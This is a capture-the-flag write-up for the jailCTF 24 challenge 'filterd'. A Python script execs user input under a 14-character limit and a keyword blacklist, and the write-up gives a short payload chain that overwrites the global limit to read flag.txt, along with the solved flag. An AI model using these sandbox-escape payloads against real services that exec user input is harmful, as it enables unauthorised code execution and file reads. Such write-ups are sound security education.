# jailCTF 24: `filterd`

## Challenge Code

```python
M = 14  # no malicious code could ever be executed since this limit is so low, right?

def f(code):
    assert len(code) <= M
    assert all(ord(c) < 128 for c in code)
    assert all(q not in code for q in ["exec", "eval", "breakpoint", "help", "license", "exit", "quit"])
    exec(code, globals())

f(input("> "))
```

## Objective

Read `flag.txt` from a server that filters user input.

- Input length is capped at **14 characters**.
- Only valid ASCII characters (0-127) are allowed.
- The following strings are blacklisted: `exec`, `eval`, `breakpoint`, `help`, `license`, `exit`, `quit`.
- If all contraints pass, the server `exec`s our input.

## Initial Observations

1. The obvious approach is to try `print(open('flag.txt').read())`, but the 14-character limit makes this impossible (even `open('flag.txt')` is too long).
2. Since `exec` runs in the global context, we can potentially modify global variables like `M` (the character limit), `f` (the vulnerable function), or Python's builtin functions to circumvent this restriction.
3. Increasing `M` by sending `M=99;f(input())` seems like a good approach, but fails because this payload is one character too long!

## Solution

- Send `i=input;f(i())` to create a shortened alias `i` for `input`, then call `f(i())` which prompts for new input and executes the vulnerable function on it.
- With our new alias `i`, we now have room to send `f(i());f(i())` which executes the vulnerable function **two more times** on fresh inputs.
- In the first input, send `M=99` to increase the global character limit.
- In the second input, send `print(open('flag.txt').read())` to read the flag now that the character limit has been increased.

## Final Payload

```python
i=input;f(i())
f(i());f(i())
M=99
print(open("flag.txt").read())
```

## Flag
`jail{can_you_repeat_that_for_me?_aacb7144d2c}`
